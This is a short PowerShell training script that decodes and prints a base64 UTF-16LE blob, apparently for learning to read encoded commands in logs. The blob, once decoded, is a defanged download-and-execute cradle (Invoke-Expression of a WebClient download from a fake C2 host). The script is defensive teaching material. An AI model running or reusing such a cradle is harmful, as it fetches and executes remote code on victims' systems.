# decode.ps1 -- decodes a base64/UTF-16LE blob (the same encoding the base64 command-line
# flag from L4.2 always uses, and the same encoding a 4104 ScriptBlock event's raw source
# can arrive in) and PRINTS the result. Decode to READ it -- never EXECUTE the result.
$b = 'aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAeAB4AHAAcwA6AC8ALwBjAGQAbgAuAGYAYQBrAGUALQBjADIAWwAuAF0AdABlAHMAdAAvAHAAMQAnACkA'
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
Write-Output $decoded
